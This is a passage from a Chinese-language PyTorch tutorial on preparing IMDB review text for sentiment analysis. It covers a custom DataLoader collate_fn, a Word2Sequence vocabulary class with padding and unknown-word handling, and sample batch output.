punctuation">,</span> <span class="token string">'every'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'anything'</span><span class="token punctuation">,</span> <span class="token string">'copy'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'worth'</span><span class="token punctuation">,</span> <span class="token string">'of'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'watching'</span><span class="token punctuation">,</span> <span class="token string">'this'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'for'</span><span class="token punctuation">,</span> <span class="token string">'film'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'its'</span><span class="token punctuation">,</span> <span class="token string">'so'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'own'</span><span class="token punctuation">,</span> <span class="token string">'it'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'merit'</span><span class="token punctuation">,</span> <span class="token string">'will'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>明显，其中的text内容出现对应，和想象的不太相似，出现问题的原因在于<code>Dataloader</code>中的参数<code>collate_fn</code></p><p><code>collate_fn</code>的默认值为torch自定义的<code>default_collate</code>,<code>collate_fn</code>的作用就是对每个batch进行处理，而默认的<code>default_collate</code>处理出错。</p><p>解决问题的思路：</p><p>手段1：考虑先把数据转化为数字序列，观察其结果是否符合要求，之前使用DataLoader并未出现类似错误</p><p>手段2：考虑自定义一个<code>collate_fn</code>，观察结果</p><p>这里使用方式2，自定义一个<code>collate_fn</code>,然后观察结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">collate_fn</span><span class="token punctuation">(</span>batch<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#batch是list，其中是一个一个元组，每个元组是dataset中__getitem__的结果</span>    batch <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token operator">*</span>batch<span class="token punctuation">)</span><span class="token punctuation">)</span>    labes <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>batch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>    texts <span class="token operator">=</span> batch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">del</span> batch    <span class="token keyword">return</span> labes<span class="token punctuation">,</span>textsdataloader <span class="token operator">=</span> DataLoader<span class="token punctuation">(</span>dataset<span class="token operator">=</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>collate_fn<span class="token operator">=</span>collate_fn<span class="token punctuation">)</span><span class="token comment">#此时输出正常</span><span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>label<span class="token punctuation">,</span>text<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"idx："</span><span class="token punctuation">,</span>idx<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table:"</span><span class="token punctuation">,</span>label<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"text:"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span>    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-2-文本序列化">3.2 文本序列化</h5><blockquote><p>再介绍word embedding的时候，我们说过，不会直接把文本转化为向量，而是先转化为数字，再把数字转化为向量，那么这个过程该如何实现呢？</p></blockquote><p>这里我们可以考虑把文本中的每个<strong>词语和其对应的数字，使用字典保存</strong>，同时实现方法<strong>把句子通过字典映射为包含数字的列表</strong>。</p><p>实现文本序列化之前，考虑以下几点:</p><ol><li>如何使用字典把词语和数字进行对应</li><li>不同的词语出现的次数不尽相同，是否需要对高频或者低频词语进行过滤，以及总的词语数量是否需要进行限制</li><li>得到词典之后，如何把句子转化为数字序列，如何把数字序列转化为句子</li><li>不同句子长度不相同，每个batch的句子如何构造成相同的长度（可以对短句子进行填充，填充特殊字符）</li><li>对于新出现的词语在词典中没有出现怎么办（可以使用特殊字符代理）</li></ol><p>思路分析：</p><ol><li>对所有句子进行分词</li><li>词语存入字典，根据次数对词语进行过滤，并统计次数</li><li>实现文本转数字序列的方法</li><li>实现数字序列转文本方法</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">class</span> <span class="token class-name">Word2Sequence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    UNK_TAG <span class="token operator">=</span> <span class="token string">"UNK"</span>    PAD_TAG <span class="token operator">=</span> <span class="token string">"PAD"</span>    UNK <span class="token operator">=</span> <span class="token number">0</span>    PAD <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span>            self<span class="token punctuation">.</span>UNK_TAG <span class="token punctuation">:</span>self<span class="token punctuation">.</span>UNK<span class="token punctuation">,</span>            self<span class="token punctuation">.</span>PAD_TAG <span class="token punctuation">:</span>self<span class="token punctuation">.</span>PAD        <span class="token punctuation">}</span>        self<span class="token punctuation">.</span>fited <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">to_index</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""word -&gt; index"""</span>        <span class="token keyword">assert</span> self<span class="token punctuation">.</span>fited <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">"必须先进行fit操作"</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>word<span class="token punctuation">,</span>self<span class="token punctuation">.</span>UNK<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">to_word</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""index -&gt; word"""</span>        <span class="token keyword">assert</span> self<span class="token punctuation">.</span>fited <span class="token punctuation">,</span> <span class="token string">"必须先进行fit操作"</span>        <span class="token keyword">if</span> index <span class="token keyword">in</span> self<span class="token punctuation">.</span>inversed_dict<span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>inversed_dict<span class="token punctuation">[</span>index<span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>UNK_TAG    <span class="token keyword">def</span> <span class="token function">__len__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">fit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sentences<span class="token punctuation">,</span> min_count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> max_count<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> max_feature<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :param sentences:[[word1,word2,word3],[word1,word3,wordn..],...]        :param min_count: 最小出现的次数        :param max_count: 最大出现的次数        :param max_feature: 总词语的最大数量        :return:        """</span>        count <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token keyword">for</span> sentence <span class="token keyword">in</span> sentences<span class="token punctuation">:</span>            <span class="token keyword">for</span> a <span class="token keyword">in</span> sentence<span class="token punctuation">:</span>                <span class="token keyword">if</span> a <span class="token keyword">not</span> <span class="token keyword">in</span> count<span class="token punctuation">:</span>                    count<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>                count<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment"># 比最小的数量大和比最大的数量小的需要</span>        <span class="token keyword">if</span> min_count <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            count <span class="token operator">=</span> <span class="token punctuation">{</span>k<span class="token punctuation">:</span> v <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> count<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> v <span class="token operator">&gt;=</span> min_count<span class="token punctuation">}</span>        <span class="token keyword">if</span> max_count <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            count <span class="token operator">=</span> <span class="token punctuation">{</span>k<span class="token punctuation">:</span> v <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> count<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> v <span class="token operator">&lt;=</span> max_count<span class="token punctuation">}</span>        <span class="token comment"># 限制最大的数量</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>max_feature<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            count <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>count<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> max_feature <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span> <span class="token operator">&gt;</span> max_feature<span class="token punctuation">:</span>                count <span class="token operator">=</span> count<span class="token punctuation">[</span><span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>max_feature<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> w<span class="token punctuation">,</span> _ <span class="token keyword">in</span> count<span class="token punctuation">:</span>                self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">[</span>w<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>count<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">[</span>w<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fited <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token comment"># 准备一个index-&gt;word的字典</span>        self<span class="token punctuation">.</span>inversed_dict <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">transform</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sentence<span class="token punctuation">,</span>max_len<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        实现吧句子转化为数组（向量）        :param sentence:        :param max_len:        :return:        """</span>        <span class="token keyword">assert</span> self<span class="token punctuation">.</span>fited<span class="token punctuation">,</span> <span class="token string">"必须先进行fit操作"</span>        <span class="token keyword">if</span> max_len <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>PAD<span class="token punctuation">]</span><span class="token operator">*</span>max_len        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>PAD<span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>sentence<span class="token punctuation">)</span>        <span class="token keyword">if</span> max_len <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sentence<span class="token punctuation">)</span><span class="token operator">&gt;</span>max_len<span class="token punctuation">:</span>            sentence<span class="token operator">=</span>sentence<span class="token punctuation">[</span><span class="token punctuation">:</span>max_len<span class="token punctuation">]</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span>word <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>sentence<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>to_index<span class="token punctuation">(</span>word<span class="token punctuation">)</span>        <span class="token keyword">return</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>r<span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int64<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">inverse_transform</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>indices<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        实现从数组 转化为文字        :param indices: [1,2,3....]        :return:[word1,word2.....]        """</span>        sentence <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> indices<span class="token punctuation">:</span>            word <span class="token operator">=</span> self<span class="token punctuation">.</span>to_word<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            sentence<span class="token punctuation">.</span>append<span class="token punctuation">(</span>word<span class="token punctuation">)</span>        <span class="token keyword">return</span> sentence<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    w2s <span class="token operator">=</span> Word2Sequence<span class="token punctuation">(</span><span class="token punctuation">)</span>    w2s<span class="token punctuation">.</span>fit<span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token punctuation">[</span><span class="token string">"你"</span><span class="token punctuation">,</span> <span class="token string">"好"</span><span class="token punctuation">,</span> <span class="token string">"么"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">"你"</span><span class="token punctuation">,</span> <span class="token string">"好"</span><span class="token punctuation">,</span> <span class="token string">"哦"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>w2s<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>w2s<span class="token punctuation">.</span>fited<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>w2s<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"你"</span><span class="token punctuation">,</span><span class="token string">"好"</span><span class="token punctuation">,</span><span class="token string">"嘛"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>w2s<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"你好嘛"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>max_len<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成了<code>wordsequence</code>之后，接下来就是保存现有样本中的数据字典，方便后续的使用。</p><p>实现对IMDB数据的处理和保存</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#1. 对IMDB的数据记性fit操作</span><span class="token keyword">def</span> <span class="token function">fit_save_word_sequence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> wordSequence <span class="token keyword">import</span> Word2Sequence    ws <span class="token operator">=</span> Word2Sequence<span class="token punctuation">(</span><span class="token punctuation">)</span>    train_path <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>data_base_path<span class="token punctuation">,</span>i<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"train/neg"</span><span class="token punctuation">,</span><span class="token string">"train/pos"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    total_file_path_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> train_path<span class="token punctuation">:</span>        total_file_path_list<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> cur_path <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>total_file_path_list<span class="token punctuation">,</span><span class="token builtin">ascii</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>desc<span class="token operator">=</span><span class="token string">"fitting"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ws<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>tokenize<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ws<span class="token punctuation">.</span>build_vocab<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 对wordSequesnce进行保存</span>    pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>ws<span class="token punctuation">,</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./model/ws.pkl"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#2. 在dataset中使用wordsequence</span>ws <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./model/ws.pkl"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">collate_fn</span><span class="token punctuation">(</span>batch<span class="token punctuation">)</span><span class="token punctuation">:</span>    MAX_LEN <span class="token operator">=</span> <span class="token number">500</span>     <span class="token comment">#MAX_LEN = max([len(i) for i in texts]) #取当前batch的最大值作为batch的最大长度</span>    batch <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token operator">*</span>batch<span class="token punctuation">)</span><span class="token punctuation">)</span>    labes <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>batch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span><span class="token builtin">int</span><span class="token punctuation">)</span>    texts <span class="token operator">=</span> batch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment">#获取每个文本的长度</span>    lengths <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&lt;</span>MAX_LEN <span class="token keyword">else</span> MAX_LEN <span class="token keyword">for</span> i <span class="token keyword">in</span> texts<span class="token punctuation">]</span>    texts <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span>ws<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>i<span class="token punctuation">,</span> MAX_LEN<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> texts<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">del</span> batch    <span class="token keyword">return</span> labes<span class="token punctuation">,</span>texts<span class="token punctuation">,</span>lengths<span class="token comment">#3. 获取输出</span>dataset <span class="token operator">=</span> ImdbDataset<span class="token punctuation">(</span>ws<span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token string">"train"</span><span class="token punctuation">)</span>    dataloader <span class="token operator">=</span> DataLoader<span class="token punctuation">(</span>dataset<span class="token operator">=</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>collate_fn<span class="token operator">=</span>collate_fn<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>label<span class="token punctuation">,</span>text<span class="token punctuation">,</span>length<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"idx："</span><span class="token punctuation">,</span>idx<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table:"</span><span class="token punctuation">,</span>label<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"text:"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"length:"</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">idx： <span class="token number">0</span>table<span class="token punctuation">:</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>         <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>text<span class="token punctuation">:</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">50983</span><span class="token punctuation">,</span>  <span class="token number">77480</span><span class="token punctuation">,</span>  <span class="token number">82366</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">54702</span><span class="token punctuation">,</span>  <span class="token number">57262</span><span class="token punctuation">,</span> <span class="token number">102035</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>  <span class="token number">80474</span><span class="token punctuation">,</span>  <span class="token number">56457</span><span class="token punctuation">,</span>  <span class="token number">63180</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">26991</span><span class="token punctuation">,</span>  <span class="token number">57693</span><span class="token punctuation">,</span>  <span class="token number">88450</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">51138</span><span class="token punctuation">,</span>  <span class="token number">73263</span><span class="token punctuation">,</span>  <span class="token number">80428</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>  <span class="token number">7022</span><span class="token punctuation">,</span>  <span class="token number">78114</span><span class="token punctuation">,</span>  <span class="token number">83498</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>  <span class="token number">5353</span><span class="token punctuation">,</span> <span class="token number">101803</span><span class="token punctuation">,</span>  <span class="token number">99148</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>length<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">296</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">407</span><span class="token 